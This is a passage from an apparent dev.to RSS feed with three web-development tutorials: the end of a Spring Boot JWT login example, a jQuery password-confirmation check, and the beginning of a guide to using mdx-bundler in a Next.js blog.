&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Zo7RboyG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pveuztp5p2dsqj5fk5co.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Zo7RboyG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pveuztp5p2dsqj5fk5co.png" alt="spring-boot-login-example-jwt-project-structure" width="330" height="740"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;security&lt;/strong&gt;: we configure Spring Security &amp;amp; implement Security Objects here.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;
&lt;code&gt;WebSecurityConfig&lt;/code&gt; extends &lt;code&gt;WebSecurityConfigurerAdapter&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;UserDetailsServiceImpl&lt;/code&gt; implements &lt;code&gt;UserDetailsService&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;UserDetailsImpl&lt;/code&gt; implements &lt;code&gt;UserDetails&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;AuthEntryPointJwt&lt;/code&gt; implements &lt;code&gt;AuthenticationEntryPoint&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;AuthTokenFilter&lt;/code&gt; extends &lt;code&gt;OncePerRequestFilter&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;JwtUtils&lt;/code&gt; provides methods for generating, parsing, validating JWT&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;controllers&lt;/strong&gt; handle signup/login requests &amp;amp; authorized requests.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;
&lt;code&gt;AuthController&lt;/code&gt;: @PostMapping('/signup'), @PostMapping('/signin'), @PostMapping('/signout')&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;TestController&lt;/code&gt;: @GetMapping('/api/test/all'), @GetMapping('/api/test/[role]')&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;repository&lt;/strong&gt; has interfaces that extend Spring Data JPA &lt;code&gt;JpaRepository&lt;/code&gt; to interact with MySQL Database.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;
&lt;code&gt;UserRepository&lt;/code&gt; extends &lt;code&gt;JpaRepository&amp;lt;User, Long&amp;gt;&lt;/code&gt;
&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;RoleRepository&lt;/code&gt; extends &lt;code&gt;JpaRepository&amp;lt;Role, Long&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;models&lt;/strong&gt; defines two main models for Authentication (&lt;code&gt;User&lt;/code&gt;) &amp;amp; Authorization (&lt;code&gt;Role&lt;/code&gt;). They have many-to-many relationship.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;
&lt;code&gt;User&lt;/code&gt;: id, username, email, password, roles&lt;/li&gt;
    &lt;li&gt;
&lt;code&gt;Role&lt;/code&gt;: id, name&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt; defines classes for Request and Response objects&lt;/p&gt;

&lt;p&gt;We also have &lt;strong&gt;application.properties&lt;/strong&gt; for configuring Spring Datasource, Spring Data JPA and App properties (such as JWT Secret string or Token expiration time).&lt;/p&gt;

&lt;p&gt;For step by step instruction and Github, please visit:&lt;br&gt;
&lt;a href="https://www.bezkoder.com/spring-boot-login-example-mysql/"&gt;Spring Boot Login example with JWT and MySQL&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span id="Further_Reading"&gt;Further Reading&lt;/span&gt;&lt;/h2&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/"&gt;Spring Security Reference&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/jwt-json-web-token/"&gt;In-depth Introduction to JWT-JSON Web Token&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://www.bezkoder.com/spring-boot-jwt-mysql-spring-security-architecture/"&gt;Architecture: Spring Boot 2 JWT Authentication with Spring Security&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Related Posts:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-jpa-crud-rest-api/"&gt;Spring Boot, Spring Data JPA – Building Rest CRUD API example&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-pagination-filter-jpa-pageable/"&gt;Spring Boot Pagination &amp;amp; Filter example | Spring JPA, Pageable&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-graphql-mysql-jpa/"&gt;CRUD GraphQL APIs example with Spring Boot, MySQL &amp;amp; Spring JPA&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-rest-xml/"&gt;Spring Boot Rest XML example – Web service with XML Response&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-file-upload/"&gt;Spring Boot File upload example with Multipart File&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-restcontrolleradvice/"&gt;@RestControllerAdvice example in Spring Boot&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-controlleradvice-exceptionhandler/"&gt;Spring Boot @ControllerAdvice &amp;amp; @ExceptionHandler example&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-unit-test-jpa-repo-datajpatest/"&gt;@DataJpaTest example for Spring Data Repositiory Unit Test&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Deployment:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href="https://www.bezkoder.com/deploy-spring-boot-aws-eb/"&gt;Deploy Spring Boot App on AWS – Elastic Beanstalk&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://www.bezkoder.com/docker-compose-spring-boot-mysql/"&gt;Docker Compose: Spring Boot and MySQL example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Fullstack CRUD App:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bezkoder.com/spring-boot-vue-js-crud-example/"&gt;Spring Boot + Vue.js example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bezkoder.com/angular-spring-boot-crud/"&gt;Angular 8 + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bezkoder.com/angular-10-spring-boot-crud/"&gt;Angular 10 + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bezkoder.com/angular-11-spring-boot-crud/"&gt;Angular 11 + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.bezkoder.com/angular-12-spring-boot-crud/"&gt;Angular 12 + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.bezkoder.com/spring-boot-angular-13-crud/"&gt;Angular 13 + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bezkoder.com/react-spring-boot-crud/"&gt;React + Spring Boot example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you need a working front-end for this back-end, you can find Client App in the posts:&lt;br&gt;
(just modify using Local Storage to Cookies)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.bezkoder.com/jwt-vue-vuex-authentication/"&gt;Vue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.bezkoder.com/angular-jwt-authentication/"&gt;Angular 8&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/angular-10-jwt-auth/"&gt;Angular 10&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/angular-11-jwt-auth/"&gt;Angular 11&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/angular-12-jwt-auth/"&gt;Angular 12&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/angular-13-jwt-auth/"&gt;Angular 13&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.bezkoder.com/react-jwt-auth/"&gt;React&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/react-hooks-jwt-auth/"&gt;React Hooks&lt;/a&gt; / &lt;a href="https://www.bezkoder.com/react-redux-jwt-auth/"&gt;React + Redux&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>spring</category>
      <category>webdev</category>
      <category>java</category>
      <category>todayilearned</category>
    </item>
    <item>
      <title>How To Validate Password And Confirm Password Using JQuery</title>
      <author>Techsolutionstuff</author>
      <pubDate>Wed, 15 Dec 2021 02:55:59 +0000</pubDate>
      <link>https://dev.to/techsolutionstuff/how-to-validate-password-and-confirm-password-using-jquery-364d</link>
      <guid>https://dev.to/techsolutionstuff/how-to-validate-password-and-confirm-password-using-jquery-364d</guid>
      <description>&lt;p&gt;In this tutorial I will show you how to validate password and confirm password using jquery. Validation is basic and important feature for authenticate user. &lt;/p&gt;

&lt;p&gt;So, here I will give you example about password and confirm password validation using jquery. In user registration process, we need to validate password and confirm password validation for cross checking.&lt;/p&gt;

&lt;p&gt;So, let's see how to match password and confirm password in jquery validation or how to validate password and confirm password using jquery. &lt;/p&gt;

&lt;p&gt;In jquery we are using on keyup event to check whether password and confirm password is match or not.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
      &amp;lt;head&amp;gt;
        &amp;lt;meta charset="utf-8"&amp;gt;
        &amp;lt;title&amp;gt;How To Validate Password And Confirm Password Using JQuery - techsolutionstuff.com&amp;lt;/title&amp;gt;
        &amp;lt;link href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet"&amp;gt;
        &amp;lt;script src="https://code.jquery.com/jquery-3.5.1.min.js"&amp;gt;&amp;lt;/script&amp;gt;
        &amp;lt;script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"&amp;gt;&amp;lt;/script&amp;gt;
      &amp;lt;/head&amp;gt;
      &amp;lt;div class="row"&amp;gt;
        &amp;lt;div class="col-md-6 col-md-offset-3"&amp;gt; 
&amp;lt;h4 style="margin-top:50px;"&amp;gt;&amp;lt;b&amp;gt;How To Validate Password And Confirm Password Using JQuery - techsolutionstuff.com&amp;lt;/b&amp;gt;&amp;lt;/h4&amp;gt;&amp;lt;br /&amp;gt;
            Enter Password &amp;lt;input type="password" class="form-control" id="Password" placeholder="Enter a password" name="password"&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;br / &amp;gt;
            Enter Confirm Password &amp;lt;input type="password" class="form-control" id="ConfirmPassword" placeholder="Enter a Confirm Password" name="confpassword" &amp;gt;
            &amp;lt;div style="margin-top: 7px;" id="CheckPasswordMatch"&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/div&amp;gt;
  &amp;lt;body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;script&amp;gt;
$(document).ready(function () {
   $("#ConfirmPassword").on('keyup', function(){
    var password = $("#Password").val();
    var confirmPassword = $("#ConfirmPassword").val();
    if (password != confirmPassword)
        $("#CheckPasswordMatch").html("Password does not match !").css("color","red");
    else
        $("#CheckPasswordMatch").html("Password match !").css("color","green");
   });
});
&amp;lt;/script&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://techsolutionstuff.com/post/how-to-generate-barcode-in-laravel"&gt;Read Also : How To Generate Barcode In Laravel&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;




&lt;p&gt;And you will get output like below image.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6XiK416U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k7x3luxqm2v5uaydyjga.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6XiK416U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k7x3luxqm2v5uaydyjga.png" alt="how_to_validate_password_and_confirm_password_using_jquery" width="744" height="298"&gt;&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;You might also like :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://techsolutionstuff.com/post/how-to-send-email-in-laravel-example"&gt;Read Also : How To Send Email In Laravel Example&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://techsolutionstuff.com/post/autotab-to-next-input-field-jquery-example"&gt;Read Also : Autotab To Next Input Field JQuery Example&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href="https://techsolutionstuff.com/post/crop-image-before-upload-using-croppie-plugin"&gt;Read Also : Crop Image Before Upload Using Croppie Plugin&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>javascript</category>
      <category>jquery</category>
      <category>validate</category>
      <category>password</category>
    </item>
    <item>
      <title>Beginners Guide to Using mdx-bundler With Your Next.js Blog</title>
      <author>Peter</author>
      <pubDate>Wed, 15 Dec 2021 02:50:37 +0000</pubDate>
      <link>https://dev.to/peterlunch/beginners-guide-to-using-mdx-bundler-with-your-nextjs-blog-9k2</link>
      <guid>https://dev.to/peterlunch/beginners-guide-to-using-mdx-bundler-with-your-nextjs-blog-9k2</guid>
      <description>&lt;p&gt;When I was building this blog, I knew I wanted a lot of customization (I'm a junior dev who loves customization). In order to get maximum customization I found out I could use &lt;a href="https://mdxjs.com/"&gt;MDX&lt;/a&gt; for my blog posts.&lt;/p&gt;

&lt;p&gt;MDX is an extension on Markdown which, lets you import custom React components into your blog posts. To use MDX with Next.js you need to use a separate package. There are a few choices with &lt;a href="https://github.com/hashicorp/next-mdx-remote"&gt;MDX-remote&lt;/a&gt; being a popular one, but it has some drawbacks. For that reason, I chose to use mdx-bundler.&lt;/p&gt;

&lt;p&gt;What mdx-bundler allows you to do is bundle React components into your blog posts. I use it for reusable custom components, things like &lt;a href="https://www.peterlunch.com/snippets/next-image-styling"&gt;image styling&lt;/a&gt;, the code blocks you see in my posts and, the anchor tags.&lt;/p&gt;

&lt;p&gt;When I was setting mdx-bundler up I had just finished my Bootcamp and I didn't know what I was doing (I still don't ha). Meaning I ran into a lot of hurdles and got quite frustrated. So, now that I have it "working" I want to help others get it working on their Next.js blogs because it really is a joy to work with.&lt;/p&gt;

&lt;p&gt;This post aims to do just that by breaking down how to use mdx-bundler with Next.js. So let's get into it, starting at step 1, installation.&lt;/p&gt;

&lt;p&gt;This post aims to do just that by breaking down how to use mdx-bundler with Next.js, if you want to know how to style your MDX codeblocks you can &lt;a href="https://www.peterlunch.com/blog/prism-react-render-nextjs"&gt;see my post here&lt;/a&gt;. So let's get into it, starting at step 1, installation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;

&lt;p&gt;Installation is pretty straight forward and to be honest you can follow the instructions at the official &lt;a href="https://github.com/kentcdodds/mdx-bundler#installation"&gt;GitHub repo&lt;/a&gt;. But, for the sake of not forcing you to switch tabs let's go through it below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="nt"&gt;--save&lt;/span&gt; mdx-bundler esbuild

// OR

yarn add mdx-bundler esbuild
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Yep, it is that simple. Now with that out of the way, it's time to unleash the power of mdx-bundler on your Next.js project.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#adding-mdxbundler-to-your-data-fetching-functions"&gt;
  &lt;/a&gt;
  Adding Mdx-Bundler to Your Data Fetching Functions
&lt;/h2&gt;

&lt;p&gt;Alright, you have mdx-bundler in your blogs packages. Now, we need to integrate it into our data fetching functions. This post assumes you already have a data fetching utility function added to your Next.js project. If you don't, not to worry you can follow the &lt;a href="url="&gt;helpful tutorial&lt;/a&gt; from Next.js that will help you get it set up. I followed this guide when setting my blog up so the code below should be mostly the same, except for a few different function names.&lt;/p&gt;

&lt;p&gt;If you followed the Next.js guide then you should have a utility that finds your blog posts and the metadata (frontmatter) that comes with it. Below is what this utility might look like (the functions have been shortened as they match the Next.js tutorial).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;fs&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;path&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;matter&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;gray-matter&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;bundleMDX&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;mdx-bundler&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;blogDirectory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cwd&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;blog&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;getBlogPostData&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// same as nextjs tutorial&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;getAllPostSlugs&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// same as nextjs tutorial&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;getPostData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fullPath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;blogDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.mdx`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;source&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFileSync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fullPath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;utf8&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;frontmatter&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;bundleMDX&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;source&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;xdmOptions&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;remarkPlugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[...(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;?.&lt;/span&gt;&lt;span class="nx"&gt;remarkPlugins&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt; &lt;span class="p"&gt;[]),&lt;/span&gt; &lt;span class="nx"&gt;remarkGfm&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
      &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;rehypePlugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[...(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;?.&lt;/span&gt;&lt;span class="nx"&gt;rehypePlugins&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt; &lt;span class="p"&gt;[]),&lt;/span&gt; &lt;span class="nx"&gt;rehypePrism&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;frontmatter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above snippet, the magic happens in the &lt;code&gt;getPostData&lt;/code&gt; function. Here is where we utilize the &lt;code&gt;mdx-bundler&lt;/code&gt; package. There are a few things going on in this function and we are going to look into what is happening with the &lt;code&gt;mdx-bundler&lt;/code&gt; part.&lt;/p&gt;

&lt;p&gt;First, we import the &lt;code&gt;bundleMDX&lt;/code&gt; into the file, so that we can use it in the &lt;code&gt;getPostData&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;Within the function, we are  each of your mdx files in the &lt;code&gt;blogDirectory&lt;/code&gt; using the &lt;code&gt;bundleMDX&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;The destructured &lt;code&gt;code&lt;/code&gt; variable contains the contents of the mdx file things like your headings, images, links and, paragraphs. Importantly it also contains all the React components you have in the file.&lt;/p&gt;

&lt;p&gt;Finally, the destructured &lt;code&gt;frontmatter&lt;/code&gt; variable is the metadata for your post. It is the stuff at the top of a post that looks like the below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight markdown"&gt;&lt;code&gt;&lt;span class="nn"&gt;---&lt;/span&gt;
&lt;span class="na"&gt;title&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;MDX"&lt;/span&gt;
&lt;span class="na"&gt;date&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;2021-10-23T09:15:00-0400"&lt;/span&gt;
&lt;span class="na"&gt;subtitle&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;MDX&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;beginners&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;guide"&lt;/span&gt;
&lt;span class="na"&gt;excerpt&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;A&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;look&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;at&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;how&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;to&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;make&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;the&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;most&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;of&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;MDX&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;in&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;your&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;blog"&lt;/span&gt;
&lt;span class="na"&gt;category&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;coding"&lt;/span&gt;
&lt;span class="nn"&gt;---&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



